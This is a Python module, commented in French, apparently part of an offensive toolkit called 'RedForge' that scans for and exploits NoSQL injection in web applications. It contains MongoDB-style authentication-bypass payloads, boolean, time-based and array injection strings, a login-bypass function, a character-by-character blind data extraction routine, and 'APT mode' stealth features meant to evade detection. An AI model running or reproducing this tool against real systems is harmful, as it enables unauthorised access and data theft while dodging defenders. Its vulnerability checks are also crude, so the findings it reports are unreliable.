#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Module d'injection NoSQL pour RedForge
Détecte et exploite les vulnérabilités d'injection NoSQL (MongoDB, CouchDB, etc.)
Version avec support furtif, APT et techniques avancées
"""

import re
import time
import random
import json
import requests
import base64
from typing import Dict, Any, List, Optional, Tuple, Set
from dataclasses import dataclass, field
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote
from concurrent.futures import ThreadPoolExecutor, as_completed

@dataclass
class NoSQLInjectionConfig:
    """Configuration avancée pour l'injection NoSQL"""
    # Délais
    delay_between_requests: Tuple[float, float] = (0.5, 1.5)
    delay_between_tests: Tuple[float, float] = (1, 3)
    
    # Comportement
    max_payloads: int = 50
    timeout: int = 10
    test_json: bool = True
    test_url: bool = True
    
    # Furtivité
    stealth_headers: bool = True
    random_user_agents: bool = True
    random_delays: bool = True
    
    # APT
    apt_mode: bool = False
    passive_detection: bool = False
    avoid_detection: bool = True
    
    # Analyse avancée
    detect_db_type: bool = True
    test_boolean_blind: bool = True
    test_time_blind: bool = True
    max_blind_attempts: int = 30


class NoSQLInjection:
    """Détection et exploitation avancée des injections NoSQL"""
    
    def __init__(self, config: Optional[NoSQLInjectionConfig] = None):
        """
        Initialise le détecteur d'injection NoSQL
        
        Args:
            config: Configuration personnalisée
        """
        self.config = config or NoSQLInjectionConfig()
        
        # Payloads d'injection NoSQL
        self.payloads = self._generate_payloads()
        
        # Signatures d'erreur NoSQL
        self.error_signatures = {
            "mongodb": [
                'MongoError', 'MongoDB', 'Uncaught MongoDB', 'cannot be applied to a field',
                'unknown operator', 'CastError', 'ValidationError', 'MongoNetworkError',
                'MongoServerError', 'MongoTimeoutError', 'MongoParseError',
                '$err', 'code: ', 'MongoCursorNotFound'
            ],
            "couchdb": [
                'couchdb', 'CouchError', 'nano', '{"error":"bad_request"',
                '{"error":"unauthorized"', '{"error":"not_found"'
            ],
            "dynamodb": [
                'DynamoDB', 'ConditionalCheckFailed', 'ValidationException',
                'ResourceNotFoundException', 'AmazonDynamoDB'
            ],
            "elasticsearch": [
                'Elasticsearch', 'SearchPhaseExecutionException', 'QueryPhaseExecutionException',
                'elasticsearch.exceptions'
            ]
        }
        
        # Opérateurs NoSQL
        self.nosql_operators = [
            '$eq', '$ne', '$gt', '$gte', '$lt', '$lte', '$in', '$nin',
            '$or', '$and', '$not', '$nor', '$exists', '$type', '$regex',
            '$where', '$size', '$all', '$elemMatch', '$mod', '$text',
            '$search', '$slice', '$inc', '$set', '$unset', '$push', '$pull'
        ]
        
        # User agents pour furtivité
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/121.0'
        ]
        
        # Métriques
        self.start_time = None
        self.payloads_tested = 0
        self.vulnerabilities_found = 0
        self.rate_limit_hits = 0
    
    def _generate_payloads(self) -> Dict[str, Any]:
        """Génère une liste complète de payloads d'injection NoSQL"""
        payloads = {
            "Authentication Bypass": {
                "mongodb": [
                    {"$ne": ""}, {"$gt": ""}, {"$regex": ".*"}, {"$ne": None},
                    {"$or": []}, {"$where": "1==1"}, {"$ne": "invalid"},
                    {"$nin": [""]}, {"$exists": True}
                ],
                "json": [
                    '{"$ne": ""}', '{"$gt": ""}', '{"$regex": ".*"}',
                    '{"$ne": null}', '{"$or": []}', '{"$where": "1==1"}'
                ]
            },
            "Boolean Based": {
                "url": [
                    "admin' && '1'=='1", "admin' && '1'=='0",
                    "' || '1'=='1", "' || '1'=='0",
                    "admin' %26%26 '1'=='1", "' %7C%7C '1'=='1",
                    "admin' && 'a'=='a", "admin' && 'a'=='b"
                ],
                "json": [
                    '{"$eq": "admin"}', '{"$ne": "invalid"}',
                    '{"$gt": ""}', '{"$lt": "zzz"}'
                ]
            },
            "Union Based": {
                "mongodb": [
                    {"$or": [{"username": "admin"}, {"password": {"$ne": ""}}]},
                    {"$and": [{"username": "admin"}, {"password": {"$ne": ""}}]},
                    {"$or": [{"$and": [{"username": "admin"}, {"password": {"$ne": ""}}]}]}
                ]
            },
            "Time Based": [
                "'; sleep(5000); '",
                "'; setTimeout(function(){}, 5000); '",
                "' || (function(){ sleep(5000); return true; })()",
                "'; var d=new Date(); while(d.getTime()<Date.now()+5000); '",
                "' || (function(){ var d=new Date(); while(d.getTime()<Date.now()+5000); return true; })()",
                "{$where: 'sleep(5000) || 1==1'}",
                "{$where: 'function(){var d=new Date();while(d.getTime()<Date.now()+5000);return true}()'}"
            ],
            "Special Characters": [
                "'", '"', '\\', '$', '{', '}', '[', ']', '(', ')',
                ';', '--', '/*', '*/', '#', '%00', '\\x00'
            ],
            "Array Injection": [
                "admin[$ne]", "admin[$regex]", "password[$ne]",
                "username[$ne]=admin", "password[$regex]=.*"
            ]
        }
        
        return payloads
    
    def scan(self, target: str, **kwargs) -> Dict[str, Any]:
        """
        Scanne les vulnérabilités d'injection NoSQL
        
        Args:
            target: URL cible
            **kwargs: Options de configuration
                - params: Paramètres spécifiques à tester
                - data: Données POST
                - json_data: Données JSON
                - apt_mode: Mode APT
        """
        self.start_time = time.time()
        self.payloads_tested = 0
        self.vulnerabilities_found = 0
        
        # Mettre à jour la configuration
        self._update_config(kwargs)
        
        if not target.startswith(('http://', 'https://')):
            target = 'https://' + target
        
        print(f"  → Scan des injections NoSQL sur {target}")
        if self.config.apt_mode:
            print(f"  🕵️ Mode APT activé - Tests discrets")
        
        vulnerabilities = []
        tested_params = set()
        
        params_to_test = self._get_params_to_test(target, kwargs)
        post_data = kwargs.get('data')
        json_data = kwargs.get('json_data')
        
        for idx, param in enumerate(params_to_test):
            if param in tested_params:
                continue
            tested_params.add(param)
            
            # Pause APT
            if self.config.apt_mode and idx > 0:
                self._apt_pause()
            elif self.config.random_delays and idx > 0:
                time.sleep(random.uniform(*self.config.delay_between_tests))
            
            # Test JSON injection
            if self.config.test_json:
                json_vulns = self._test_json_payloads(target, param, json_data, post_data)
                vulnerabilities.extend(json_vulns)
                if json_vulns:
                    self.vulnerabilities_found += len(json_vulns)
                    for vuln in json_vulns:
                        print(f"      ✓ Injection NoSQL (JSON): {param}")
            
            # Test URL injection
            if self.config.test_url and not vulnerabilities:
                url_vulns = self._test_url_payloads(target, param)
                vulnerabilities.extend(url_vulns)
                if url_vulns:
                    self.vulnerabilities_found += len(url_vulns)
                    for vuln in url_vulns:
                        print(f"      ✓ Injection NoSQL (URL): {param} -> {vuln['payload'][:40]}...")
        
        return self._generate_results(target, vulnerabilities)
    
    def _update_config(self, kwargs: Dict):
        """Met à jour la configuration avec les kwargs"""
        if 'max_payloads' in kwargs:
            self.config.max_payloads = kwargs['max_payloads']
        if 'test_json' in kwargs:
            self.config.test_json = kwargs['test_json']
        
        # Mode APT
        if kwargs.get('apt_mode', False) or kwargs.get('stealth_level') == 'apt':
            self.config.apt_mode = True
            self.config.passive_detection = True
            self.config.avoid_detection = True
            self.config.stealth_headers = True
            self.config.random_delays = True
            self.config.max_payloads = min(self.config.max_payloads, 20)
            self.config.delay_between_tests = (5, 15)
    
    def _get_stealth_headers(self, additional_headers: Optional[Dict] = None) -> Dict[str, str]:
        """Génère des headers furtifs"""
        headers = {
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive'
        }
        
        if self.config.random_user_agents:
            headers['User-Agent'] = random.choice(self.user_agents)
        
        if self.config.stealth_headers:
            headers['Cache-Control'] = 'no-cache'
            headers['Pragma'] = 'no-cache'
        
        if additional_headers:
            headers.update(additional_headers)
        
        return headers
    
    def _get_params_to_test(self, target: str, kwargs: Dict) -> List[str]:
        """Récupère la liste des paramètres à tester"""
        params = kwargs.get('params', [])
        
        if not params:
            params = self._extract_params(target)
        
        if not params:
            params = ['user', 'username', 'login', 'email', 'id', 'search', 'q',
                     'filter', 'query', 'name', 'password', 'token', 'key']
        
        # Limiter en mode APT
        if self.config.apt_mode:
            params = params[:10]
        
        return params
    
    def _extract_params(self, target: str) -> List[str]:
        """Extrait les paramètres de l'URL"""
        parsed = urlparse(target)
        if parsed.query:
            return list(parse_qs(parsed.query).keys())
        return []
    
    def _test_json_payloads(self, target: str, param: str, 
                            json_data: Optional[Dict],
                            post_data: Optional[str]) -> List[Dict[str, Any]]:
        """Teste des payloads NoSQL en JSON"""
        vulnerabilities = []
        
        json_payloads = [
            {param: {"$ne": ""}},
            {param: {"$gt": ""}},
            {param: {"$regex": ".*"}},
            {param: {"$ne": None}},
            {param: {"$or": []}},
            {param: {"$where": "1==1"}},
            {param: {"$nin": [""]}},
            {param: {"$exists": True}},
            {param: {"$ne": "invalid"}}
        ]
        
        for payload in json_payloads[:self.config.max_payloads]:
            if self.config.random_delays:
                time.sleep(random.uniform(0.3, 0.8))
            
            result = self._test_json_payload(target, param, payload, json_data, post_data)
            self.payloads_tested += 1
            
            if result['vulnerable']:
                vulnerabilities.append({
                    "parameter": param,
                    "payload": str(payload)[:80] + "..." if len(str(payload)) > 80 else str(payload),
                    "category": "json_injection",
                    "severity": "HIGH",
                    "evidence": result['evidence'],
                    "db_type": result.get('db_type', 'unknown'),
                    "risk_score": 85
                })
                return vulnerabilities
        
        return vulnerabilities
    
    def _test_json_payload(self, target: str, param: str, payload: Dict,
                           json_data: Optional[Dict],
                           post_data: Optional[str]) -> Dict[str, Any]:
        """Teste un payload JSON NoSQL"""
        result = {
            'vulnerable': False,
            'payload': None,
            'evidence': '',
            'db_type': None
        }
        
        try:
            headers = self._get_stealth_headers({'Content-Type': 'application/json'})
            
            if json_data:
                test_data = json_data.copy()
                test_data.update(payload)
            else:
                test_data = payload
            
            response = requests.post(target, json=test_data, headers=headers,
                                    timeout=self.config.timeout, verify=False)
            
            # Vérifier les signatures d'erreur
            for db_type, signatures in self.error_signatures.items():
                for signature in signatures:
                    if signature.lower() in response.text.lower():
                        result['vulnerable'] = True
                        result['evidence'] = signature
                        result['db_type'] = db_type
                        return result
            
            # Vérifier les changements de comportement
            if response.status_code == 200 and len(response.text) > 100:
                result['vulnerable'] = True
                result['evidence'] = 'behavior_change'
                
        except requests.Timeout:
            if self.config.test_time_blind:
                result['vulnerable'] = True
                result['evidence'] = 'time_based'
        except Exception:
            pass
        
        return result
    
    def _test_url_payloads(self, target: str, param: str) -> List[Dict[str, Any]]:
        """Teste des payloads NoSQL dans l'URL"""
        vulnerabilities = []
        
        url_payloads = [
            # Boolean based
            "admin' && '1'=='1",
            "admin' && '1'=='0",
            "' || '1'=='1",
            "' || '1'=='0",
            # Array injection
            f"{param}[$ne]=admin",
            f"{param}[$regex]=.*",
            # Special characters
            "'", '"', '$', '{', '}'
        ]
        
        for payload in url_payloads[:self.config.max_payloads]:
            if self.config.random_delays:
                time.sleep(random.uniform(0.3, 0.8))
            
            result = self._test_url_payload(target, param, payload)
            self.payloads_tested += 1
            
            if result['vulnerable']:
                vulnerabilities.append({
                    "parameter": param,
                    "payload": payload[:80] + "..." if len(payload) > 80 else payload,
                    "category": "url_injection",
                    "severity": "HIGH",
                    "evidence": result['evidence'],
                    "type": result.get('type', 'unknown'),
                    "risk_score": 85
                })
                return vulnerabilities
        
        return vulnerabilities
    
    def _test_url_payload(self, target: str, param: str, payload: str) -> Dict[str, Any]:
        """Teste un payload NoSQL dans l'URL"""
        result = {
            'vulnerable': False,
            'evidence': '',
            'type': None
        }
        
        parsed = urlparse(target)
        query_params = parse_qs(parsed.query)
        
        # Pour les injections de type array
        if '[' in payload and ']' in payload:
            # Format: param[$ne]=value
            query_params = {payload.split('=')[0]: [payload.split('=')[1]]}
        else:
            if param in query_params:
                original_value = query_params[param][0]
                query_params[param] = [original_value + payload]
            else:
                query_params[param] = [payload]
        
        new_query = urlencode(query_params, doseq=True)
        test_url = urlunparse(parsed._replace(query=new_query))
        
        try:
            headers = self._get_stealth_headers()
            response = requests.get(test_url, headers=headers,
                                  timeout=self.config.timeout, verify=False)
            
            # Vérifier les signatures
            for db_type, signatures in self.error_signatures.items():
                for signature in signatures:
                    if signature.lower() in response.text.lower():
                        result['vulnerable'] = True
                        result['evidence'] = signature
                        result['type'] = 'error_based'
                        return result
            
            # Vérifier les différences de réponse
            if 'true' in response.text.lower() or 'false' in response.text.lower():
                result['vulnerable'] = True
                result['evidence'] = 'boolean_based'
                result['type'] = 'boolean_based'
                
        except requests.Timeout:
            if self.config.test_time_blind:
                result['vulnerable'] = True
                result['evidence'] = 'time_based'
                result['type'] = 'time_based'
        except Exception:
            pass
        
        return result
    
    def _apt_pause(self):
        """Pause APT pour simuler un comportement humain"""
        if random.random() < 0.3:
            pause_duration = random.uniform(30, 120)
            print(f"      💤 Pause APT: {pause_duration:.0f}s")
            time.sleep(pause_duration)
    
    def _generate_results(self, target: str, vulnerabilities: List[Dict]) -> Dict[str, Any]:
        """Génère les résultats de l'attaque"""
        duration = time.time() - self.start_time
        
        return {
            "target": target,
            "vulnerabilities": vulnerabilities,
            "count": len(vulnerabilities),
            "payloads_tested": self.payloads_tested,
            "scan_duration": duration,
            "payloads_per_second": self.payloads_tested / duration if duration > 0 else 0,
            "config": {
                "apt_mode": self.config.apt_mode,
                "test_json": self.config.test_json,
                "test_url": self.config.test_url
            },
            "summary": self._generate_summary(vulnerabilities),
            "recommendations": self._generate_recommendations(vulnerabilities)
        }
    
    def _generate_summary(self, vulnerabilities: List[Dict]) -> Dict[str, Any]:
        """Génère un résumé des vulnérabilités"""
        if not vulnerabilities:
            return {"total": 0, "severity": "INFO", "message": "Aucune injection NoSQL détectée"}
        
        return {
            "total": len(vulnerabilities),
            "by_category": {
                "json": len([v for v in vulnerabilities if v['category'] == 'json_injection']),
                "url": len([v for v in vulnerabilities if v['category'] == 'url_injection'])
            },
            "by_db_type": {
                "mongodb": len([v for v in vulnerabilities if v.get('db_type') == 'mongodb']),
                "couchdb": len([v for v in vulnerabilities if v.get('db_type') == 'couchdb'])
            },
            "high_severity": len(vulnerabilities),
            "max_risk_score": max([v.get('risk_score', 0) for v in vulnerabilities]) if vulnerabilities else 0
        }
    
    def _generate_recommendations(self, vulnerabilities: List[Dict]) -> List[str]:
        """Génère des recommandations basées sur les vulnérabilités trouvées"""
        recommendations = set()
        
        if vulnerabilities:
            recommendations.add("Utiliser des requêtes paramétrées ou des ORM sécurisés")
            recommendations.add("Valider et échapper les entrées utilisateur")
            recommendations.add("Éviter d'utiliser des opérateurs NoSQL dangereux ($where, $regex)")
        
        if any(v['category'] == 'json_injection' for v in vulnerabilities):
            recommendations.add("Désactiver l'acceptation de JSON brut si non nécessaire")
            recommendations.add("Valider le schéma JSON avant traitement")
        
        if any(v.get('db_type') == 'mongodb' for v in vulnerabilities):
            recommendations.add("Désactiver l'exécution de JavaScript côté serveur (--noscripting)")
        
        return list(recommendations)
    
    def bypass_auth_json(self, target: str, param: str) -> Dict[str, Any]:
        """
        Tente de contourner l'authentification via JSON injection
        
        Args:
            target: URL cible
            param: Paramètre à injecter
        """
        bypass_payloads = [
            {param: {"$ne": ""}},
            {param: {"$gt": ""}},
            {param: {"$regex": ".*"}},
            {param: {"$ne": None}},
            {param: {"$or": []}}
        ]
        
        for payload in bypass_payloads:
            try:
                headers = self._get_stealth_headers({'Content-Type': 'application/json'})
                response = requests.post(target, json=payload, headers=headers,
                                        timeout=self.config.timeout, verify=False)
                
                if response.status_code == 200 and len(response.text) > 0:
                    return {
                        "success": True,
                        "payload": payload,
                        "response_length": len(response.text),
                        "response_preview": response.text[:200]
                    }
            except Exception:
                continue
        
        return {"success": False}
    
    def extract_data_blind(self, target: str, param: str, 
                           attribute: str = "username") -> Dict[str, Any]:
        """
        Extraction de données via blind boolean injection
        
        Args:
            target: URL cible
            param: Paramètre vulnérable
            attribute: Attribut à extraire
        """
        result = {
            "success": False,
            "extracted_data": [],
            "method": "blind_boolean"
        }
        
        # Payload pour extraction
        chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-@.'
        
        for position in range(1, self.config.max_blind_attempts):
            for char in chars:
                # Construction du payload pour tester le caractère
                payload = f"admin' && this.{attribute}[{position}] == '{char}' && '1'=='1"
                
                test_result = self._test_url_payload(target, param, payload)
                
                if test_result['vulnerable'] and test_result['type'] == 'boolean_based':
                    result["extracted_data"].append(char)
                    break
            else:
                break
        
        if result["extracted_data"]:
            result["success"] = True
            result["extracted_data"] = ''.join(result["extracted_data"])
        
        return result
    
    def get_statistics(self) -> Dict[str, Any]:
        """Retourne les statistiques de détection"""
        return {
            "payloads_tested": self.payloads_tested,
            "vulnerabilities_found": self.vulnerabilities_found,
            "success_rate": (self.vulnerabilities_found / max(1, self.payloads_tested) * 100),
            "scan_duration": time.time() - self.start_time if self.start_time else 0,
            "rate_limit_hits": self.rate_limit_hits
        }


# Point d'entrée pour tests
if __name__ == "__main__":
    # Test mode normal
    print("=== Test mode normal ===")
    injection = NoSQLInjection()
    results = injection.scan("https://example.com/login?user=admin")
    print(f"Vulnérabilités NoSQL: {results['count']}")
    
    # Test mode APT
    print("\n=== Test mode APT ===")
    apt_config = NoSQLInjectionConfig(apt_mode=True, max_payloads=20)
    injection_apt = NoSQLInjection(config=apt_config)
    results_apt = injection_apt.scan("https://example.com/login?user=admin", apt_mode=True)
    print(f"Vulnérabilités NoSQL (APT): {results_apt['count']}")
    
    # Exemple de bypass JSON
    if results_apt['vulnerabilities']:
        vuln = results_apt['vulnerabilities'][0]
        bypass_result = injection_apt.bypass_auth_json(
            "https://example.com/login",
            vuln['parameter']
        )
        if bypass_result['success']:
            print(f"Bypass JSON réussi: {bypass_result['payload']}")
    
    # Afficher les recommandations
    for rec in results_apt['recommendations']:
        print(f"Recommandation: {rec}")